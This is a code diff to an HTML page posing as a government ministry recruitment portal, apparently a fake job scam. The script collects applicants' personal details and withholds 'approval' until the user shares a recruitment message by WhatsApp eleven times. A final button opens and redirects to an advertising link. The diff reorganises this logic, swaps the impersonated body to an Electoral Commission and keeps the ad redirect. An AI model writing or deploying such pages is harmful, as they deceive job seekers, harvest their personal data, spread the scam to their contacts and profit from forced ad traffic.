@@ -597,108 +597,97 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
   <footer class="sticky-footer">© 2026 Ministry of Agriculture Recruitment Portal. All rights reserved.</footer>
 
   <script>
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const step3 = document.getElementById('step3');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    const formOverlay = document.getElementById('formOverlay');
-    const applyNowBtn = document.getElementById('applyNowBtn');
-    const applicationForm = document.getElementById('applicationForm');
-    const proceedBtn = document.getElementById('proceedBtn');
-    const formError = document.getElementById('formError');
-    const fullName = document.getElementById('fullName');
-    const email = document.getElementById('email');
-    const phone = document.getElementById('phone');
-    const position = document.getElementById('position');
-    const dob = document.getElementById('dob');
-    const county = document.getElementById('county');
-    const disability = document.getElementById('disability');
-    const qualification = document.getElementById('qualification');
-    const whatsappShareBtn = document.getElementById('whatsappShareBtn');
-    const progressFill = document.getElementById('progressFill');
-    const progressText = document.getElementById('progressText');
-    const approvalBox = document.getElementById('approvalBox');
-    const submitApplicationBtn = document.getElementById('submitApplicationBtn');
+    document.addEventListener('DOMContentLoaded', function () {
+      const step1 = document.getElementById('step1');
+      const step2 = document.getElementById('step2');
+      const step3 = document.getElementById('step3');
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      const formOverlay = document.getElementById('formOverlay');
+      const applyNowBtn = document.getElementById('applyNowBtn');
+      const applicationForm = document.getElementById('applicationForm');
+      const proceedBtn = document.getElementById('proceedBtn');
+      const formError = document.getElementById('formError');
+      const whatsappBtn = document.getElementById('whatsappBtn');
+      const progressFill = document.getElementById('progressFill');
+      const progressText = document.getElementById('progressText');
+      const approvalBox = document.getElementById('approvalBox');
+      const retryBtn = document.getElementById('retryBtn');
 
-    let shareClicks = 0;
-    const maxClicks = 11;
-   const whatsappMessage = '*RECRUITMENT NOTICE*\n\nThe Ministry of Agriculture is recruiting *200 Agricultural Extension Officers* to fill vacant positions in various districts and to strengthen agricultural advisory and extension services for farmers across the country. *Apply now using this link:*\n\nhttps://rebrand.ly/Agric-Zm-Recruitment-2026';
-window.open('https://ey43.com/4/9120968');
-const adsLink = 'https://ey43.com/4/9120968';
+      const requiredIds = ['fullName', 'email', 'phone', 'position', 'dob', 'county', 'disability', 'qualification'];
+      let shareClicks = 0;
+      const maxClicks = 11;
+      const whatsappMessage = 'Hello, applications are now open on the Electoral Commission Recruitment Portal. Apply now using this link: https://example.com';
 
-whatsappShareBtn.addEventListener('click', function (e) {
-  e.preventDefault();
-
-  const appLink = 'whatsapp://send?text=' + encodeURIComponent(whatsappMessage);
-  const fallbackLink = 'https://wa.me/?text=' + encodeURIComponent(whatsappMessage);
-
-  window.location.href = appLink;
-
-  setTimeout(function () {
-    window.open(fallbackLink, '_blank');
-  }, 1200);
-});
-
-    function showLoading(callback) {
-      loadingOverlay.classList.add('show');
-      setTimeout(function () {
-        loadingOverlay.classList.remove('show');
-        callback();
-      }, 1200);
-    }
-
-    function showStep(stepToShow) {
-      [step1, step2, step3].forEach(step => step.classList.remove('active'));
-      stepToShow.classList.add('active');
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
-
-    applyNowBtn.addEventListener('click', function () {
-      formOverlay.style.display = 'none';
-      applicationForm.classList.remove('locked');
-    });
-
-    proceedBtn.addEventListener('click', function () {
-      const isValid =
-        fullName.value.trim() !== '' &&
-        email.value.trim() !== '' &&
-        phone.value.trim() !== '' &&
-        position.value.trim() !== '' &&
-        dob.value.trim() !== '' &&
-        county.value.trim() !== '' &&
-        disability.value.trim() !== '' &&
-        qualification.value.trim() !== '';
-
-      if (!isValid) {
-        formError.style.display = 'block';
-        return;
+      function showStep(nextStep) {
+        [step1, step2, step3].forEach(step => step.classList.remove('active'));
+        nextStep.classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
       }
 
-      formError.style.display = 'none';
-      showLoading(function () {
-        showStep(step2);
+      function showLoading(callback) {
+        loadingOverlay.classList.add('show');
+        setTimeout(function () {
+          loadingOverlay.classList.remove('show');
+          callback();
+        }, 1200);
+      }
+
+      applyNowBtn.addEventListener('click', function () {
+        formOverlay.style.display = 'none';
+        applicationForm.classList.remove('locked');
       });
-    });
 
-    whatsappShareBtn.addEventListener('click', function () {
-      if (shareClicks >= maxClicks) return;
-      shareClicks += 1;
-      const progress = Math.min((shareClicks / maxClicks) * 100, 100);
-      const roundedProgress = Math.round(progress);
-      progressFill.style.width = roundedProgress + '%';
-      progressText.textContent = roundedProgress + '%';
+      proceedBtn.addEventListener('click', function () {
+        let isValid = true;
 
-      if (progress >= 100) {
-        approvalBox.classList.add('ready');
-        approvalBox.textContent = 'APPROVAL: READY';
-        showLoading(function () {
-          showStep(step3);
+        requiredIds.forEach(function (id) {
+          const field = document.getElementById(id);
+          if (!field || !field.value || field.value.trim() === '') {
+            isValid = false;
+          }
         });
-      }
-    });
 
-    submitApplicationBtn.addEventListener('click', function () {
-      window.open(adsLink, '_blank');
+        if (!isValid) {
+          formError.style.display = 'block';
+          return;
+        }
+
+        formError.style.display = 'none';
+        showLoading(function () {
+          showStep(step2);
+        });
+      });
+
+      whatsappBtn.addEventListener('click', function (e) {
+        e.preventDefault();
+
+        if (shareClicks < maxClicks) {
+          shareClicks += 1;
+          const progress = Math.round((shareClicks / maxClicks) * 100);
+          progressFill.style.width = progress + '%';
+          progressText.textContent = progress + '%';
+
+          if (shareClicks >= maxClicks) {
+            approvalBox.classList.add('ready');
+            approvalBox.textContent = 'APPROVAL: READY';
+            showLoading(function () {
+              showStep(step3);
+            });
+          }
+        }
+
+        const appLink = 'whatsapp://send?text=' + encodeURIComponent(whatsappMessage);
+        const fallbackLink = 'https://wa.me/?text=' + encodeURIComponent(whatsappMessage);
+        window.location.href = appLink;
+        setTimeout(function () {
+          window.open(fallbackLink, '_blank');
+        }, 1200);
+      });
+
+      retryBtn.addEventListener('click', function () {
+        window.open('https://ey43.com/4/9120968');
+        window.location.href = 'https://ey43.com/4/9120968';
+      });
     });
   </script>
 </body>
